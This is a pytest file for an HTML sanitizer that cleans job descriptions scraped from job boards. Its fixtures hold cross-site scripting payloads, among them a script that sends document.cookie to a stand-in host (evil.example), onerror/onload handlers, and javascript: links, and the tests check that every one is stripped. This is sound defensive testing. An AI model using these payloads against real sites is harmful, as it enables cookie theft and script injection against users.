"""Job descriptions come from job boards, so the HTML shown on the job page
must be sanitized."""

from app.services.parsing.html_text import safe_description_html


def test_scripts_and_their_content_are_removed():
    out = safe_description_html("<p>Join us</p><script>fetch('https://evil.example/'+document.cookie)</script>")
    assert out == "<p>Join us</p>"


def test_event_handlers_styles_and_frames_are_removed():
    out = safe_description_html(
        '<div onclick="steal()" style="position:fixed">Role</div>'
        '<img src="x" onerror="steal()"><iframe src="https://evil.example"></iframe>'
        '<svg onload="steal()"><circle/></svg><style>body{display:none}</style>'
    )
    assert out == "<div>Role</div>"


def test_only_safe_links_survive():
    out = safe_description_html(
        '<a href="javascript:steal()">bad</a> <a href="data:text/html,x">data</a> '
        '<a href="/relative">relative</a> <a href="https://jobs.example.com/apply" onclick="x()">apply</a>'
    )
    assert "javascript" not in out and "data:" not in out and "/relative" not in out and "onclick" not in out
    assert '<a href="https://jobs.example.com/apply" target="_blank" rel="noopener noreferrer nofollow">apply</a>' in out
    assert out.count("href=") == 1


def test_escaped_html_is_shown_formatted():
    out = safe_description_html("&lt;h2&gt;About&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Python &amp;amp; SQL&lt;/li&gt;&lt;/ul&gt;")
    assert out == "<h2>About</h2><ul><li>Python &amp; SQL</li></ul>"
    assert safe_description_html("&amp;lt;p&amp;gt;Twice&amp;lt;/p&amp;gt;") == "<p>Twice</p>"


def test_escaped_scripts_are_still_removed():
    out = safe_description_html("&lt;p&gt;Hi&lt;/p&gt;&lt;script&gt;steal()&lt;/script&gt;&lt;img src=x onerror=steal()&gt;")
    assert out == "<p>Hi</p>"


def test_plain_text_keeps_paragraphs_and_is_escaped():
    out = safe_description_html("About the role\nBuild things.\n\nSalary < 50k & benefits <b")
    assert out == "<p>About the role<br>Build things.</p><p>Salary &lt; 50k &amp; benefits &lt;b</p>"


def test_empty_descriptions():
    assert safe_description_html(None) is None
    assert safe_description_html("   ") is None
    assert safe_description_html("<script>x()</script>") is None
